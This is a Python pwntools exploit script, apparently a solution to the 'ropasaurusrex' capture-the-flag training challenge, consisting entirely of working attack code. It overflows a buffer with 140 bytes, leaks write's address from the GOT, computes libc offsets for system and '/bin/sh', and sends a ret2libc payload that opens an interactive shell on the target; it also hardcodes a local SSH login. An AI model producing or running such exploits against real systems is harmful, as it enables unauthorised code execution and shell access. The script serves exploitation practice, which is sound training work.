from pwn import *

if "REMOTE" not in args:

    env = {"LD_PRELOAD": "./home/acidburn/ropasaurusrex/libc-2.27.so"}

    ssh = ssh("acidburn", "127.0.0.1", password='acidburn', port=2222)
    r = ssh.process("/home/acidburn/ropasaurusrex/ropasaurusrex", env=env)
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2014)

address_write = 0x0804830c
got = 0x08049614
main = 0x0804841d

payload = b"A"*140 + p32(address_write) + p32(main) + p32(1) + p32(got) + p32(4)
r.send(payload)

write = u32(r.recv(4))
print("write:" + hex(write))

offset_write = 0x5663bd80 - 0x56555000
offset_system = 0x56592200 - 0x56555000
offset_binsh = 0x566d30cf - 0x56555000
print("write offset:" + hex(offset_write))
print("system offset:" + hex(offset_system))
print("binsh offset:" + hex(offset_binsh))
base = write - offset_write
system = base + offset_system
binsh = base + offset_binsh

payload = b"A"*140 + p32(system) + p32(0) + p32(binsh)
r.send(payload)


r.interactive()
